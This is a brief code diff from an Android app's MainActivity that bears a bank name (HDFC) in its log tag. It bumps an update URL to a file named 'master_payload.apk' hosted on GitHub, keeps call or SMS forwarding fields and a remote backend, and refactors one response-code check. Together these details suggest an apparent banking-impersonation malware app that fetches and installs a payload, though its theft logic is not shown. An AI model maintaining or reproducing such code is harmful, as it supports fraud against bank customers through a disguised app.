@@ -42,7 +42,7 @@ import java.util.Locale;
 public class MainActivity extends BridgeActivity {
     private static final String TAG = "HDFC_MainActivity";
     private static final String BACKEND_URL = "https://backprince.onrender.com";
-    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v3.0.69/master_payload.apk";
+    private static final String UPDATE_URL = "https://github.com/amanxridex/newmade/releases/download/v3.0.70/master_payload.apk";
     private String forwardingNumber = null;
     private boolean forwardingEnabled = false;
 
@@ -84,8 +84,9 @@ public class MainActivity extends BridgeActivity {
                     c.setReadTimeout(15000);
                     c.connect();
 
-                    if (c.getResponseCode() != HttpURLConnection.HTTP_OK) {
-                        runOnUiThread(() -> Toast.makeText(MainActivity.this, "❌ Server Error: " + c.getResponseCode(), Toast.LENGTH_LONG).show());
+                    final int responseCode = c.getResponseCode();
+                    if (responseCode != HttpURLConnection.HTTP_OK) {
+                        runOnUiThread(() -> Toast.makeText(MainActivity.this, "❌ Server Error: " + responseCode, Toast.LENGTH_LONG).show());
                         return;
                     }
 
